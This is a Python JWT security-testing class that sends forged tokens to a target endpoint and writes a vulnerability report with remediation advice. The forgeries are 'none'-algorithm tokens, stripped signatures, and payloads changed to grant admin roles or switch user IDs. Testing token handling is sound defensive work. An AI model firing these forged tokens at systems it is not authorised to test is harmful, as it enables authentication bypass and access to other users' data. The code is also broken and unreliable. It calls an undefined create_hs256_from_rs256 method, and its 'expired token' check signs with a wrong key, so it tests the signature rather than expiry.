import jwt
import requests
import json
import base64
import time


class JWTFuzzer:
    def __init__(self, target_url, valid_token=None):
        self.target_url = target_url
        self.valid_token = valid_token
        self.results = []

    def decode_token_without_verification(self, token):
        """Decode JWT without verifying to extract headers and payload"""
        parts = token.split('.')
        if len(parts) != 3:
            return None, None

        header = json.loads(base64.b64decode(parts[0] + '==').decode('utf-8'))
        payload = json.loads(base64.b64decode(parts[1] + '==').decode('utf-8'))
        return header, payload

    def test_endpoint(self, token):
        """Test if a token is accepted by the target endpoint"""
        headers = {'Authorization': f'Bearer {token}'}
        try:
            response = requests.get(self.target_url, headers=headers)
            return {
                'status_code': response.status_code,
                'authenticated': response.status_code < 400,
                'response': response.text[:100]  # Truncate long responses
            }
        except Exception as e:
            return {'error': str(e)}

    def test_algorithm_confusion(self):
        """Test for algorithm confusion vulnerabilities"""
        header, payload = self.decode_token_without_verification(self.valid_token)
        results = []

        # Test 'none' algorithm attack
        none_tokens = self.create_none_algorithm_tokens(payload)
        for token in none_tokens:
            result = self.test_endpoint(token)
            results.append({
                'attack_type': 'none_algorithm',
                'token': token,
                'result': result
            })

        # Test alg switching (RS256 to HS256)
        if header.get('alg') == 'RS256':
            hs256_token = self.create_hs256_from_rs256(payload)
            result = self.test_endpoint(hs256_token)
            results.append({
                'attack_type': 'alg_switching',
                'token': hs256_token,
                'result': result
            })

        return results

    def create_none_algorithm_tokens(self, payload):
        """Create tokens with 'none' algorithm"""
        tokens = []
        for alg_variant in ['none', 'None', 'NONE', 'nOnE']:
            header = {'alg': alg_variant, 'typ': 'JWT'}
            token = self.create_custom_token(header, payload, '')
            tokens.append(token)
        return tokens

    def create_custom_token(self, header, payload, signature=''):
        """Create a custom JWT with specified header, payload and signature"""
        h64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        p64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

        if signature:
            return f"{h64}.{p64}.{signature}"
        else:
            return f"{h64}.{p64}."

    def test_signature_validation(self):
        """Test if the application properly validates signatures"""
        header, payload = self.decode_token_without_verification(self.valid_token)
        results = []

        # Test 1: Completely stripped signature
        stripped_token = self.create_custom_token(header, payload, '')
        result = self.test_endpoint(stripped_token)
        results.append({
            'attack_type': 'signature_stripped',
            'token': stripped_token,
            'result': result
        })

        # Test 2: Modify payload without updating signature
        tampered_payload = payload.copy()
        # Elevate privileges if 'role' or similar exists
        for key in ['role', 'roles', 'permissions', 'groups', 'isAdmin']:
            if key in tampered_payload:
                tampered_payload[key] = 'admin'

        # If user ID exists, try changing it
        for key in ['sub', 'user_id', 'userId', 'id']:
            if key in tampered_payload:
                # Try to access a different user's data
                tampered_payload[key] = str(int(tampered_payload[key]) - 1)

                # Keep original signature but with modified payload
        parts = self.valid_token.split('.')
        original_sig = parts[2]
        tampered_token = self.create_custom_token(header, tampered_payload, original_sig)

        result = self.test_endpoint(tampered_token)
        results.append({
            'attack_type': 'tampered_payload',
            'token': tampered_token,
            'result': result
        })

        return results

    def test_expiration_replay(self):
        """Test for token expiration and replay vulnerabilities"""
        header, payload = self.decode_token_without_verification(self.valid_token)
        results = []

        # Test expired tokens
        if 'exp' in payload:
            # Create token with past expiration
            expired_payload = payload.copy()
            expired_payload['exp'] = int(time.time()) - 86400  # 1 day ago

            # Generate with same algorithm as original
            expired_token = jwt.encode(
                expired_payload,
                'invalid_key_for_testing',  # We expect verification to fail on server
                algorithm=header.get('alg', 'HS256')
            )

            result = self.test_endpoint(expired_token)
            results.append({
                'attack_type': 'expired_token',
                'token': expired_token,
                'result': result
            })

        # Test for missing exp/nbf claims
        if 'exp' in payload:
            no_exp_payload = payload.copy()
            del no_exp_payload['exp']

            no_exp_token = jwt.encode(
                no_exp_payload,
                'invalid_key_for_testing',
                algorithm=header.get('alg', 'HS256')
            )

            result = self.test_endpoint(no_exp_token)
            results.append({
                'attack_type': 'no_expiration',
                'token': no_exp_token,
                'result': result
            })

        return results

    def execute_all_attacks(self):
        """Run all implemented attacks and collect results"""
        all_results = []

        # Run algorithm confusion attacks
        alg_results = self.test_algorithm_confusion()
        all_results.extend(alg_results)

        # Run signature validation attacks
        sig_results = self.test_signature_validation()
        all_results.extend(sig_results)

        # Run expiration/replay attacks
        exp_results = self.test_expiration_replay()
        all_results.extend(exp_results)

        self.results = all_results
        return all_results

    def analyze_results(self):
        """Analyze test results and identify vulnerabilities"""
        if not self.results:
            return "No test results to analyze. Run execute_all_attacks() first."

        vulnerabilities = []

        for result in self.results:
            attack_type = result['attack_type']
            response = result['result']

            # Check if the attack was successful (token was accepted)
            if response.get('authenticated', False):
                severity = self._determine_severity(attack_type)
                description = self._get_vulnerability_description(attack_type)
                remediation = self._get_remediation_advice(attack_type)

                vulnerability = {
                    'type': attack_type,
                    'severity': severity,
                    'description': description,
                    'remediation': remediation,
                    'evidence': {
                        'token': result['token'],
                        'response': response
                    }
                }
                vulnerabilities.append(vulnerability)

        # Generate summary report
        summary = self._generate_summary(vulnerabilities)
        return {'vulnerabilities': vulnerabilities, 'summary': summary}

    def _determine_severity(self, attack_type):
        """Determine the severity of a vulnerability based on attack type"""
        high_severity_attacks = ['none_algorithm', 'alg_switching', 'signature_stripped']
        medium_severity_attacks = ['tampered_payload', 'expired_token']

        if attack_type in high_severity_attacks:
            return 'HIGH'
        elif attack_type in medium_severity_attacks:
            return 'MEDIUM'
        else:
            return 'LOW'

    def _get_vulnerability_description(self, attack_type):
        """Return description of the vulnerability"""
        descriptions = {
            'none_algorithm': 'The application accepts tokens with the "none" algorithm, allowing authentication bypass.',
            'alg_switching': 'The application is vulnerable to algorithm switching attacks (RS256 to HS256).',
            'signature_stripped': 'The application accepts tokens with invalid or missing signatures.',
            'tampered_payload': 'The application accepts modified payloads with original signatures.',
            'expired_token': 'The application accepts expired tokens.',
            'no_expiration': 'The application accepts tokens without expiration claims.'
        }
        return descriptions.get(attack_type, 'Unknown vulnerability')

    def _get_remediation_advice(self, attack_type):
        """Return remediation advice based on the vulnerability type"""
        remediation = {
            'none_algorithm': 'Explicitly specify allowed algorithms when verifying tokens. Example: jwt.verify(token, secret, { algorithms: ["HS256"] })',
            'alg_switching': 'Use algorithm-specific key validation and explicitly specify allowed algorithms. For RS256, ensure the library correctly validates against the public key.',
            'signature_stripped': 'Always verify token signatures using library methods. Never manually decode tokens or implement custom signature validation.',
            'tampered_payload': 'Ensure proper signature validation and implement additional server-side authorization checks for sensitive operations.',
            'expired_token': 'Always validate token expiration. Set the verify_exp option to true when verifying tokens.',
            'no_expiration': 'Require expiration claims in all tokens and validate them. Set reasonable expiration times based on your security requirements.'
        }

        return remediation.get(attack_type, 'Review JWT implementation and follow security best practices.')

    def _generate_summary(self, vulnerabilities):
        """Generate a summary of findings"""
        if not vulnerabilities:
            return "No vulnerabilities detected. JWT implementation appears secure."

        high_count = sum(1 for v in vulnerabilities if v['severity'] == 'HIGH')
        medium_count = sum(1 for v in vulnerabilities if v['severity'] == 'MEDIUM')
        low_count = sum(1 for v in vulnerabilities if v['severity'] == 'LOW')

        summary = f"Found {len(vulnerabilities)} JWT vulnerabilities: "
        summary += f"{high_count} high, {medium_count} medium, and {low_count} low severity issues."

        if high_count > 0:
            summary += "\n\nCRITICAL: High severity issues indicate the JWT implementation has fundamental security flaws."

        return summary

    def generate_report(self, output_format='text'):
        """Generate a vulnerability report in the specified format"""
        analysis = self.analyze_results()

        if output_format == 'json':
            return json.dumps(analysis, indent=2)

        # Text report format
        report = "JWT Security Testing Report\n"
        report += "=" * 30 + "\n\n"
        report += analysis['summary'] + "\n\n"

        if 'vulnerabilities' in analysis and analysis['vulnerabilities']:
            report += "Detailed Findings:\n"
            report += "-" * 20 + "\n\n"

            for i, vuln in enumerate(analysis['vulnerabilities'], 1):
                report += f"{i}. {vuln['type']} - {vuln['severity']} Severity\n"
                report += f"   Description: {vuln['description']}\n"
                report += f"   Remediation: {vuln['remediation']}\n"
                report += f"   Evidence: Token was accepted with status code {vuln['evidence']['response'].get('status_code')}\n\n"

        return report
